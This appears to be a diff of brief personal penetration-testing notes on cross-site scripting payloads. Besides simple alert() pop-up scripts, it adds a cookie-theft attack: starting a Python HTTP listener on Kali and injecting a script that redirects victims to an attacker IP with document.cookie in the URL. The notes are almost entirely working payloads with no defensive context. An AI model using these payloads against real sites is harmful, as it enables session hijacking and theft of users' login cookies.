@@ -1,3 +1,16 @@
-SIMPLE CROSS SITE SCRIPTING PAYLOAD
+SIMPLE CROSS-SITE SCRIPTING PAYLOAD
 
 <script>alert(1)</script>
+
+<script>alert("you have been hacked")</script>
+
+POP UP -cross-site scripting 
+
+
+Up server HTTP on Kali
+
+1. python -m http.server 1337
+
+2. <script>window.location='http://192.168.242.130:1337/?cookie=' + document.cookie</script> 
+
+
